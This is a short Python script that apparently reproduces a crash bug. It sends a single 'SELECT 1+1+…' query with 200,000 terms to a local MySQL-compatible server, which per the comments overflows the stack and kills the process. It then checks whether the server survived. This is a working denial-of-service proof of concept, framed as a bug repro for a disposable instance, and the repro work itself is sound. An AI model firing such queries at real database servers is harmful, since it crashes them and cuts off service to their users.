#!/usr/bin/env python3
"""Repro P0: a single COM_QUERY with a long left-associative expression chain
aborts the whole server process (stack overflow, fatal runtime error).

Note: run this only against a disposable instance; it KILLS the server.
"""
import pymysql

N = 200000  # 2k/20k are rejected cleanly; 200k crashes the process

conn = pymysql.connect(host="127.0.0.1", port=3442, user="root", password="root",
                       database="test", connect_timeout=3)
cur = conn.cursor()
sql = "SELECT " + "+".join(["1"] * N)
try:
    cur.execute(sql)
    print("query returned:", cur.fetchall())
except Exception as e:
    print(f"query error (client-visible): {type(e).__name__}: {e}")

import time
time.sleep(1.0)
try:
    c2 = pymysql.connect(host="127.0.0.1", port=3442, user="root", password="root",
                         connect_timeout=2)
    c2.close()
    print("server still alive")
except Exception:
    print("SERVER DEAD — process aborted (check server.log: 'fatal runtime error: stack overflow')")
